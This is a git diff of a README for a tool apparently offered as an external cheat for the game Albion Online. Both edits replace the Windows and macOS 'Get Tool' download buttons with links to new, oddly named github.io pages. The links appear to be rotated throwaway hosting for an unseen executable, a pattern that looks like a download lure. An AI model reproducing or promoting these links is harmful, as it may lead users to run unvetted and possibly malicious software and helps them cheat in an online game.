@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/tblptkpdvazk/albion-online-external)
 
-[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ![Albion Online External](game.jpg)
 
@@ -75,7 +75,7 @@ Albion Online by Sandbox Interactive is a player-driven sandbox MMORPG with full
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 ## ⚖️ Legal
 
